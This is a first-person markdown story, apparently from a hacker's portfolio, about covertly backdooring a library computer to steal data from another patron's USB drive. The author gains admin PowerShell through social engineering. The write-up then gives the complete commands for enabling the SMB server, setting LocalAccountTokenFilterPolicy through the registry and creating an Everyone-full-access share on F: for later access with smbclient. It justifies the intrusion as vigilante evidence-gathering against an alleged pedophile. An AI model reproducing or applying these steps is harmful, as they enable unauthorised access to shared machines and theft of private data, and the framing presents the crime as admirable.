````md id="zlmw1v"
# SMB USB ACCESS STORY

It was 9 May 2026, Saturday, and I was in a library. My goal was to access a computer's external hard disk or USB storage through `smbclient` using a Kali machine. I had access for 15 minutes on the target computer with admin PowerShell access using social engineering.

Then I checked and there were 3 disk partitions:

- `C:` → Computer default system drive
- `D:` → Computer default secondary drive
- `E:` → DVD default drive

If I wanted, I could also pentest on that, but my real goal was the next external drive because that person was a pedophile and selling videos on the Dark Web, and all his data was in his USB. So I needed proof for that.

I started deep thinking that if these drives were already used by default, then if anyone plugged in an external storage drive/disk/USB, it would most likely become partition `F:`. And I was right...

---

# THE ATTACK

First, I started the `lanmanserver` service and set it to automatic for next time, then created a share.

## Commands

```powershell id="mjcf0z"
Start-Service lanmanserver
Set-Service -Name lanmanserver -StartupType "Automatic"
````

Then I checked if it was working correctly with:

```powershell id="nyojqs"
Get-Service lanmanserver
(Get-Service lanmanserver).StartupType
```

---

Now I needed to change the Windows registry from `0` to `1`. If I didn't do that, the attack would fail.

## Registry Folder

```text id="hh2fho"
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system
```

## Registry Value

```text id="kffb0l"
LocalAccountTokenFilterPolicy
```

## Setting (Data)

* `0` = OFF
* `1` = ON

## Command

```powershell id="m0c6f3"
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

---

After that, I created an SMB share for the `F:` drive using the following command. When an external drive would be connected there, I could access it from `smbclient` because I already had access into SMB using the local user account name `Students User`.

## Command

```powershell id="i3cszn"
New-SmbShare -Name "e_drive" -Path "F:\" -FullAccess "Everyone"
```

---

Then I verified all the things:

```powershell id="7jlm4d"
Get-SmbShare
```

```powershell id="q8k6b1"
Get-Service lanmanserver
(Get-Service lanmanserver).StartupType
```

Everything was working good.

---

# FINAL RESULT

Today, on 10 May 2026 at 10:00 AM, I was in the library again and that person plugged in his USB.

Finally, I got access to my target and got all his personal data from that USB.

---

# CONTACT

* Telegram: `@DarkFR722`
* Proton: `contrastX@proton.me`
* Portfolio: [https://contrastx.vercel.app/](https://contrastx.vercel.app/)

Thanks for Reading

```
```
